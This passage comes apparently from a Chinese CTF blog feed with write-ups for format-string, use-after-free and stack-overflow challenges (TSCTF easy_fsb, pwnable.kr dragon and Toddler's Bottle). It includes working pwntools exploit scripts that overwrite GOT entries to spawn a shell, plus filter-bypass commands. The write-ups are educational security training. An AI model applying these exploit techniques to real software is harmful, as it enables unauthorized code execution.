title="分析"></a>分析</h4><p>可以看到<code>printf(a)</code>存在明显的fsb，我们知道GOT表是可写的，如果我们能够把<code>printf</code>的got表地址改成<code>system</code>的真实地址，然后调用<code>printf</code>实际上就是调用<code>system</code>，我们再传<code>&quot;/bin/sh&quot;</code>就能够getshell</p><p>首先我们要通过<strong>任意地址读</strong>得到<code>printf</code>的真实地址，利用</p><blockquote><p>printf_addr - printf_offset == system_addr - system_offset</p></blockquote><p>这一特性，获得system的真实地址，其中两个offset都可以通过获取libc版本而得到。</p><p><img src="http://wx4.sinaimg.cn/mw690/0060lm7Tly1ftzsoi9uraj30bi0740sx.jpg" alt="img"></p><p>可以看到我们的输入在偏移为4的位置被输出了，<code>%p</code>是以16进制输出地址的值，与<code>%x</code>不同的是<code>%p</code>会加上<code>0x</code>后缀。而<code>%s</code>则会把地址的值作为另一个地址以字符串的形式输出这个地址的内容，相当于比<code>%x</code>多索引一层。</p><p>所以我们可以输入<code>printf_got+%4$s</code>，从而得到<code>printf</code>的真实地址。</p><p>然后通过<strong>任意地址写</strong>，利用上面那个等式得到<code>system</code>的真实地址，用pwntools的<code>fmtstr_payload</code>直接生成payload。</p><p>（这里由于是本地练习，libc已知，有时还需要leak两三个函数的地址从而知道libc版本）</p><h4 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">__Auther__ = &apos;L1B0&apos;</span><br><span class="line"></span><br><span class="line">from pwn import *</span><br><span class="line">context.log_level = &apos;debug&apos;</span><br><span class="line"></span><br><span class="line">io = process(&apos;./fsb&apos;)</span><br><span class="line">elf = ELF(&apos;./fsb&apos;)</span><br><span class="line">libc = ELF(&apos;/lib/i386-linux-gnu/libc.so.6&apos;)</span><br><span class="line"></span><br><span class="line">#leak_printf_addr</span><br><span class="line">print_got = elf.got[&apos;printf&apos;]</span><br><span class="line">print hex(print_got)</span><br><span class="line">io.sendline( p32(print_got)+&apos;|&apos;+&apos;%4$s&apos; + &apos;|&apos; )</span><br><span class="line">io.recvuntil(&apos;|&apos;)</span><br><span class="line">print_addr = u32(io.recvuntil(&apos;|&apos;)[0:4])</span><br><span class="line"></span><br><span class="line">#get_system_addr</span><br><span class="line">system_offset = libc.symbols[&apos;system&apos;]</span><br><span class="line">print_offset = libc.symbols[&apos;printf&apos;]</span><br><span class="line">#print hex(system_offset),hex(print_offset)</span><br><span class="line"></span><br><span class="line">libc_addr = print_addr-print_offset</span><br><span class="line">system_addr = system_offset + libc_addr</span><br><span class="line">print &quot;system_addr = %x&quot; % (system_addr)</span><br><span class="line"></span><br><span class="line">#printf-&gt;system</span><br><span class="line">payload = fmtstr_payload( 4, &#123;print_got:system_addr&#125; )</span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">#getshell</span><br><span class="line">io.sendline(&apos;/bin/sh\0&apos;)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><h3 id="2017-TSCTF-easy-fsb"><a href="#2017-TSCTF-easy-fsb" class="headerlink" title="2017-TSCTF-easy_fsb"></a>2017-TSCTF-easy_fsb</h3><p>和第一个例子差不多，这里需要通过<strong>任意地址写</strong>将<code>exit</code>覆盖为<code>main</code>，达到循环的效果</p><p><a href="http://files.cnblogs.com/files/lllkh/pwn1.rar" target="_blank" rel="noopener">题目地址</a>，原题应该是提供了libc，这里就用本地的了。</p><h4 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">__Auther__ = &apos;L1B0&apos;</span><br><span class="line"></span><br><span class="line">from pwn import *</span><br><span class="line">context.log_level = &apos;debug&apos;</span><br><span class="line"></span><br><span class="line">io = process(&apos;./pwn1&apos;)</span><br><span class="line">elf = ELF(&apos;./pwn1&apos;)</span><br><span class="line">libc = ELF(&apos;/lib/i386-linux-gnu/libc.so.6&apos;)</span><br><span class="line">#offset = 7</span><br><span class="line"></span><br><span class="line">def leak(leak_got):</span><br><span class="line"></span><br><span class="line">    payload = p32(leak_got) + &apos;|&apos; + &apos;%7$s&apos; + &apos;|&apos;</span><br><span class="line"></span><br><span class="line">    io.sendline(payload)</span><br><span class="line">    io.recvuntil(&apos;|&apos;)</span><br><span class="line">    leak_addr = u32(io.recvuntil(&apos;|&apos;)[:4])</span><br><span class="line"></span><br><span class="line">    return hex(leak_addr)</span><br><span class="line"></span><br><span class="line">def loop_it():</span><br><span class="line">    </span><br><span class="line">    exit_got = elf.got[&apos;exit&apos;]</span><br><span class="line">    main_addr = elf.symbols[&apos;main&apos;]</span><br><span class="line">    payload = fmtstr_payload( 7, &#123;exit_got:main_addr&#125; )</span><br><span class="line">    io.sendline(payload)</span><br><span class="line"></span><br><span class="line">def get_shell():</span><br><span class="line"></span><br><span class="line">    printf_addr = leak(elf.got[&apos;printf&apos;])</span><br><span class="line">    print &quot;[printf] = &#123;&#125;&quot;.format(printf_addr)</span><br><span class="line">    </span><br><span class="line">    printf_offset = libc.symbols[&apos;printf&apos;]</span><br><span class="line">    system_offset = libc.symbols[&apos;system&apos;]</span><br><span class="line"></span><br><span class="line">    system_addr = system_offset + eval(printf_addr) - printf_offset</span><br><span class="line"></span><br><span class="line">    payload = fmtstr_payload( 7, &#123;elf.got[&apos;printf&apos;]:system_addr&#125; )</span><br><span class="line">    io.sendline(payload)</span><br><span class="line"></span><br><span class="line">    io.sendline(&apos;/bin/sh\0&apos;)</span><br><span class="line"></span><br><span class="line">if __name__ == &apos;__main__&apos;:</span><br><span class="line">    </span><br><span class="line">    loop_it()</span><br><span class="line">    get_shell()</span><br><span class="line"></span><br><span class="line">    io.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;References:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;p&gt;&lt;a href=&quot;https://blog.csdn.net/qq_18661257/article/details/54694748&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;关于GOT表和PLT表的作用&lt;/a&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;&lt;a href=&quot;https://www.jianshu.com/p/097e211cd9eb&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;自己实现fmtstr_payload&lt;/a&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&quot;初探&quot;&gt;&lt;a href=&quot;#初探&quot; class=&quot;headerlink&quot; title=&quot;初探&quot;&gt;&lt;/a&gt;初探&lt;/h3&gt;&lt;blockquote&gt;
&lt;p&gt;自己写了个最简单fsb的example，以此来入个门&lt;/p&gt;
&lt;/blockquote&gt;
    
    </summary>
    
    
      <category term="CTF" scheme="https://l1b0.fun/categories/CTF/"/>
    
    
      <category term="Format-String-Bug" scheme="https://l1b0.fun/tags/Format-String-Bug/"/>
    
  </entry>
  
  <entry>
    <title>Pwnable-Kr-Rookiss-dragon</title>
    <link href="https://l1b0.fun/2018/08/01/Pwnable-Kr-Rookiss-dragon/"/>
    <id>https://l1b0.fun/2018/08/01/Pwnable-Kr-Rookiss-dragon/</id>
    <published>2018-08-01T12:18:45.000Z</published>
    <updated>2019-09-17T12:20:37.802Z</updated>
    
    <content type="html"><![CDATA[<h3 id="dragon"><a href="#dragon" class="headerlink" title="dragon"></a>dragon</h3><blockquote><p>I made a RPG game for my little brother.<br>But to trick him, I made it impossible to win.<br>I hope he doesn’t get too angry with me :P!</p><p>Author : rookiss<br>Download : <a href="http://pwnable.kr/bin/dragon" target="_blank" rel="noopener">http://pwnable.kr/bin/dragon</a></p><p>Running at : nc pwnable.kr 9004</p><p>On Aug 1,2018</p></blockquote><p>UAF的一道「简单题」，但我不会。。。pwn做的太少了</p><a id="more"></a><h4 id="简要分析"><a href="#简要分析" class="headerlink" title="简要分析"></a>简要分析</h4><p>简单说一下为什么会有UAF漏洞，程序在<code>FightDragon</code>函数里声明了两个结构体<code>ptr</code>和<code>v5</code>，大小均为<code>0x10</code>，分别代表dragon和player。由于在<code>attack</code>函数中player的指针不论是失败或是胜利都会被free，但是这个指针并没有指向NULL，导致下一次malloc相同大小的空间时会分配到同一地址，当我们把修改这次的内容时实际上覆盖了player的内容，所以可以在这里「搞事情」。</p><p>用IDA看伪代码的时候觉得这肯定不用打赢龙的，于是一直在找「外围」的函数的利用点，但没找到什么有用的。之后看了别人的wp后发现是可以打赢龙的，并且非赢不可。</p><p>之所以能够打赢龙是因为「龙的血量」的数据大小是1个字节，即最大127，当更大时造成溢出变成负值，这时符合胜利条件。</p><p>之所以非赢不可是因为胜利之后会进入如下代码块</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">if ( v3 )</span><br><span class="line">&#123;</span><br><span class="line">  puts(&quot;Well Done Hero! You Killed The Dragon!&quot;);</span><br><span class="line">  puts(&quot;The World Will Remember You As:&quot;);</span><br><span class="line">  v2 = malloc(0x10u);</span><br><span class="line">  __isoc99_scanf(&quot;%16s&quot;, v2);</span><br><span class="line">  puts(&quot;And The Dragon You Have Defeated Was Called:&quot;);</span><br><span class="line">  ((void (__cdecl *)(_DWORD *))*v5)(v5);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里的<code>v2</code>分配的大小是<code>0x10</code>，和上面的结构体大小相同，于是<code>v2</code>的地址和<code>player</code>的地址相同，这时我们可以把<code>system(&#39;/bin/sh&#39;)</code>的地址输入，在最后一行调用的时候就相当于<code>getshell</code>了:-)</p><h4 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">__Auther__ = &apos;L1B0&apos;</span><br><span class="line"></span><br><span class="line">from pwn import *</span><br><span class="line">import sys</span><br><span class="line">context.log_level = &apos;debug&apos;</span><br><span class="line"></span><br><span class="line">if sys.argv[1] == &apos;loc&apos;:</span><br><span class="line">    io = process(&apos;./dragon&apos;)</span><br><span class="line">else:</span><br><span class="line">    io = remote(&apos;pwnable.kr&apos;,9004)</span><br><span class="line"></span><br><span class="line">sys_addr = 0x08048DBF</span><br><span class="line"></span><br><span class="line">def playGame():</span><br><span class="line">    </span><br><span class="line">    for i in range(4):</span><br><span class="line">        io.sendline(&apos;1&apos;)</span><br><span class="line">    for i in range(4):</span><br><span class="line">        io.sendline(&apos;3\n3\n2\n&apos;)</span><br><span class="line">    io.sendline(p32(sys_addr))</span><br><span class="line"></span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line">    </span><br><span class="line">    playGame()</span><br><span class="line">    io.interactive()</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;h3 id=&quot;dragon&quot;&gt;&lt;a href=&quot;#dragon&quot; class=&quot;headerlink&quot; title=&quot;dragon&quot;&gt;&lt;/a&gt;dragon&lt;/h3&gt;&lt;blockquote&gt;
&lt;p&gt;I made a RPG game for my little brother.&lt;br&gt;But to trick him, I made it impossible to win.&lt;br&gt;I hope he doesn’t get too angry with me :P!&lt;/p&gt;
&lt;p&gt;Author : rookiss&lt;br&gt;Download : &lt;a href=&quot;http://pwnable.kr/bin/dragon&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;http://pwnable.kr/bin/dragon&lt;/a&gt;&lt;/p&gt;
&lt;p&gt;Running at : nc pwnable.kr 9004&lt;/p&gt;
&lt;p&gt;On Aug 1,2018&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;UAF的一道「简单题」，但我不会。。。pwn做的太少了&lt;/p&gt;
    
    </summary>
    
    
      <category term="CTF" scheme="https://l1b0.fun/categories/CTF/"/>
    
    
      <category term="Pwnable-Kr" scheme="https://l1b0.fun/tags/Pwnable-Kr/"/>
    
      <category term="Pwn" scheme="https://l1b0.fun/tags/Pwn/"/>
    
  </entry>
  
  <entry>
    <title>Pwnable-Kr-Toddlers-Bottle</title>
    <link href="https://l1b0.fun/2018/07/30/Pwnable-Kr-Toddlers-Bottle/"/>
    <id>https://l1b0.fun/2018/07/30/Pwnable-Kr-Toddlers-Bottle/</id>
    <published>2018-07-30T12:16:40.000Z</published>
    <updated>2019-09-17T12:20:16.766Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>这里整理一下自己在pwnable.kr的Toddler’s-Bottle专题的wp</p><p>只放思路，不放flag:-)</p></blockquote><h3 id="fd"><a href="#fd" class="headerlink" title="fd"></a>fd</h3><blockquote><p>Description：Mommy! what is a file descriptor in Linux?</p><p>On Jul 30th,2018</p></blockquote><p>首先连上ssh，ls看到有三个文件：fd,fd.c,flag</p><a id="more"></a><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">fd@ubuntu:~$ ls</span><br><span class="line">fd  fd.c  flag</span><br></pre></td></tr></table></figure><p>尝试<code>cat flag</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">fd@ubuntu:~$ cat flag</span><br><span class="line">cat: flag: Permission denied</span><br></pre></td></tr></table></figure><p>然后看一下源码<code>cat fd.c</code></p><p><img src="http://wx1.sinaimg.cn/mw690/0060lm7Tly1ftrrpeai1bj30d30b4abn.jpg" alt="img"></p><p>了解了<code>file descriptor</code>之后会知道</p><blockquote><p>fd = 0 –&gt; 标准输入(stdin)</p><p>fd = 1 –&gt; 标准输出(stdout)</p><p>fd = 2 –&gt; 标准错误(stderr)</p></blockquote><p>而源码中<code>fd = atoi(argv[1])-0x1234</code>，并且buf是通过read读取的，那么需要使<code>fd = 0</code>。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">fd@ubuntu:~$ ./fd 4660</span><br><span class="line">LETMEWIN</span><br><span class="line">good job :)</span><br><span class="line">***************************************</span><br></pre></td></tr></table></figure><p>成功拿到flag</p><h3 id="col"><a href="#col" class="headerlink" title="col"></a>col</h3><blockquote><p>Description：Daddy told me about cool MD5 hash collision today.<br>I wanna do something like that too!</p><p>On Jul 30th,2018</p></blockquote><p>ls有三个文件col,col.c,flag</p><p>col.c内容如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line">unsigned long hashcode = 0x21DD09EC;</span><br><span class="line">unsigned long check_password(const char* p)&#123;</span><br><span class="line">    int* ip = (int*)p;</span><br><span class="line">    int i;</span><br><span class="line">    int res=0;</span><br><span class="line">    for(i=0; i&lt;5; i++)&#123;</span><br><span class="line">        res += ip[i];</span><br><span class="line">    &#125;</span><br><span class="line">    return res;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int main(int argc, char* argv[])&#123;</span><br><span class="line">    if(argc&lt;2)&#123;</span><br><span class="line">        printf(&quot;usage : %s [passcode]\n&quot;, argv[0]);</span><br><span class="line">        return 0;</span><br><span class="line">    &#125;</span><br><span class="line">    if(strlen(argv[1]) != 20)&#123;</span><br><span class="line">        printf(&quot;passcode length should be 20 bytes\n&quot;);</span><br><span class="line">        return 0;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    if(hashcode == check_password( argv[1] ))&#123;</span><br><span class="line">        system(&quot;/bin/cat flag&quot;);</span><br><span class="line">        return 0;</span><br><span class="line">    &#125;</span><br><span class="line">    else</span><br><span class="line">        printf(&quot;wrong passcode.\n&quot;);</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以知道需要输入长度为20的字符串，等分成5份后相加与<code>0x21DD09EC</code>比较</p><p>需要注意的是大端序和小端序的问题，我们输入的是大端序，而在check_password的时候是小端序相加</p><blockquote><p>举个例子：</p><p>我们输入12345678</p><p>在check时等分成两段：1234,5678</p><p>转换成int时变成：’4321’,’8765’</p></blockquote><p>还有一个坑：<code>\x09</code>是制表符，和<code>\x00</code>一样会被截断，本地测试如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$ ./col `python -c &quot;print &apos;\x01\x09&apos;&quot;`</span><br><span class="line">1 passcode length should be 20 bytes</span><br><span class="line"></span><br><span class="line">$ ./col `python -c &quot;print &apos;\x01\x00&apos;&quot;`</span><br><span class="line">1 passcode length should be 20 bytes</span><br><span class="line"></span><br><span class="line">$ ./col `python -c &quot;print &apos;\x01\x05&apos;&quot;`</span><br><span class="line">2 passcode length should be 20 bytes</span><br></pre></td></tr></table></figure><p>构造如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt;&gt; hex(0x21DD09EC-0x02020305*4)</span><br><span class="line">&apos;0x19d4fdd8&apos;</span><br></pre></td></tr></table></figure><p>拿到flag</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">col@ubuntu:~$ ./col `python -c &quot;print &apos;\x05\x03\x02\x02&apos; * 4 + &apos;\xd8\xfd\xd4\x19&apos;&quot;`</span><br><span class="line">++++++++++++++++++++++++++++++++++++++++</span><br></pre></td></tr></table></figure><h3 id="bof"><a href="#bof" class="headerlink" title="bof"></a>bof</h3><blockquote><p>Description：Nana told me that buffer overflow is one of the most common software vulnerability.<br>Is that true?</p><p>On Jul 30th,2018</p></blockquote><p>简单栈溢出，通过gets函数不检查长度的特性将a1覆盖为0xCAFEBABE</p><p>exp如下</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/env python</span><br><span class="line"># -*- coding: utf-8 -*-</span><br><span class="line">__Auther__ = &apos;L1B0&apos;</span><br><span class="line"></span><br><span class="line">from pwn import *</span><br><span class="line">context.log_level = &apos;debug&apos;</span><br><span class="line"></span><br><span class="line">io = process(&apos;./bof&apos;)</span><br><span class="line">#io = remote(&apos;pwnable.kr&apos;, 9000)</span><br><span class="line"></span><br><span class="line">payload = &apos;AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1&apos;#len = 0x2C+0x8</span><br><span class="line">payload += p32(0xCAFEBABE)</span><br><span class="line"></span><br><span class="line">io.sendlineafter(&apos;: \n&apos;,payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p>那个9000好像挂了，连不上去。只能本地get_shell</p><p><img src="http://wx1.sinaimg.cn/mw690/0060lm7Tly1ftrwvuqcaij30md08mtaa.jpg" alt="img"></p><h3 id="flag"><a href="#flag" class="headerlink" title="flag"></a>flag</h3><blockquote><p>Description：Papa brought me a packed present! let’s open it.</p><p>Download : <a href="http://pwnable.kr/bin/flag" target="_blank" rel="noopener">http://pwnable.kr/bin/flag</a></p><p>This is reversing task. all you need is binary</p><p>On Jul 30th,2018</p></blockquote><p>根据题目提示这是个加壳的elf，那么首先用<code>upx -d</code>试了一发</p><p><img src="http://wx2.sinaimg.cn/mw690/0060lm7Tly1ftry9kazjsj30jw056aag.jpg" alt="img"></p><p><del>结果发现成功了？？？这运气也太好了吧</del></p><p>后来发现<code>strins flag</code>能看到UPX字样</p><p>接着IDA看一波，点进去flag，就能发现flag:-)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aUpxSoundsLikeA db **********************************,0</span><br></pre></td></tr></table></figure><h3 id="random"><a href="#random" class="headerlink" title="random"></a>random</h3><blockquote><p>Description：Daddy, teach me how to use random value in programming!</p><p>On Jul 30th,2018</p></blockquote><p>源码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line"></span><br><span class="line">int main()&#123;</span><br><span class="line">    unsigned int random;</span><br><span class="line">    random = rand();// random value!</span><br><span class="line"></span><br><span class="line">    unsigned int key=0;</span><br><span class="line">    scanf(&quot;%d&quot;, &amp;key);</span><br><span class="line"></span><br><span class="line">    if( (key ^ random) == 0xdeadbeef )&#123;</span><br><span class="line">        printf(&quot;Good!\n&quot;);</span><br><span class="line">        system(&quot;/bin/cat flag&quot;);</span><br><span class="line">        return 0;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    printf(&quot;Wrong, maybe you should try 2^32 cases.\n&quot;);</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这道题其实是个伪随机，将源码拿到本地跑一下，将random输出，结果如下</p><p><img src="http://wx2.sinaimg.cn/mw690/0060lm7Tly1ftrvmcv9nzj30c4094dgo.jpg" alt="img"></p><p>可以看到在本地<code>random</code>一直都是<code>1804289383</code></p><p><code>0xdeadbeef^1804289383</code>拿到flag:-)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">random@ubuntu:~$ ./random </span><br><span class="line">3039230856</span><br><span class="line">Good!</span><br><span class="line">**********************************</span><br></pre></td></tr></table></figure><h3 id="cmd1"><a href="#cmd1" class="headerlink" title="cmd1"></a>cmd1</h3><blockquote><p>Description：Mommy! what is PATH environment in Linux?</p><p>On Jul 30,2018</p></blockquote><p>这题类似沙盒逃逸，不过简单很多，题目将带有<code>flag sh tmp</code>子串的命令禁用，并且修改了环境变量.</p><p>修改环境变量的结果是<code>cat</code>需要<code>/bin/cat</code>才能执行</p><p>注：cat的所在位置可以通过<code>whereis</code>命令找到</p><h4 id="方法一："><a href="#方法一：" class="headerlink" title="方法一："></a>方法一：</h4><p>不能有<code>flag</code>我们可以使用通配符来达到目的</p><p>比如说<code>./cmd1 &quot;/bin/cat f*&quot;</code>或是<code>./cmd1 &quot;/bin/cat fla?&quot;</code>都可以</p><h4 id="方法二："><a href="#方法二：" class="headerlink" title="方法二："></a>方法二：</h4><p>分割字符串</p><p><code>./cmd1 &#39;/bin/cat ”f“ag&#39;</code></p><h3 id="passcode"><a href="#passcode" class="headerlink" title="passcode"></a>passcode</h3><blockquote><p>Description：Mommy told me to make a passcode based login system.<br>My initial C code was compiled without any error!<br>Well, there was some compiler warning, but who cares about that?</p><p>On Jul 30,2018</p></blockquote><p>首先<code>file passcode</code>，是32位的elf，于是先从pwnable.kr上把它copy下来，便于本地分析</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">scp -P 2222 passcode@143.248.249.64:/home/passcode/passcode /home/****/Desktop</span><br></pre></td></tr></table></figure><p>看源码会发现<code>passcode1</code>和<code>passcode2</code>的赋值没加<code>&amp;</code>，所以我们的<strong>输入</strong>会当做<strong>地址</strong>将其<strong>原有的地址覆盖</strong>，但由于题目check的<code>passcode1 = 338150</code>和<code>passcode2 = 13371337</code>这两个地址<strong>不可写</strong>，在所以在运行时会报错。</p><p>并且<code>checksec passcode</code>可以看到</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$ checksec passcode</span><br><span class="line">[*] </span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found #开启栈保护</span><br><span class="line">    NX:       NX enabled #堆栈不可执行，即不能用shellcode的栈溢出方式getshell</span><br><span class="line">    PIE:      No PIE (0x8048000) #基址不随机</span><br></pre></td></tr></table></figure><p>所以直接想符合这个条件是不可能了。</p><p>这里用到了一个叫<code>GOT表覆写</code>的操作，GOT表是一个函数指针数组，里面的函数地址可写，故我们可以通过改变函数的地址来改变程序流程。</p><p>用IDA可以看到<code>welcome</code>函数的<code>name</code>数组长度有100，由于<code>welcome</code>函数和l<code>login</code>函数是连续执行，中间没有压栈等操作，故ebp是相同的。而name的地址为<code>ebp-0x70</code>，passcode1的地址是<code>ebp-0x10</code>，相差0x60即96，所以正好还有四个字节可以供我们将got表的<code>printf</code>函数地址传进passcode1，然后把<code>system(&#39;/bin/cat flag&#39;)</code>的地址传进passcode2，达到修改got表里<code>printf</code>函数地址的目的，下次执行<code>printf</code>函数时即<code>cat flag</code>。</p><blockquote><p>一个trick：IDA里<code>crtl+s</code>可以查看各个段的地址</p></blockquote><h4 id="第一种方法：运行exp脚本"><a href="#第一种方法：运行exp脚本" class="headerlink" title="第一种方法：运行exp脚本"></a>第一种方法：运行exp脚本</h4><p>在passcode文件夹里没有权限，我们可以退到tmp文件夹里编写脚本(不知道为什么提示没有权限写…)</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span 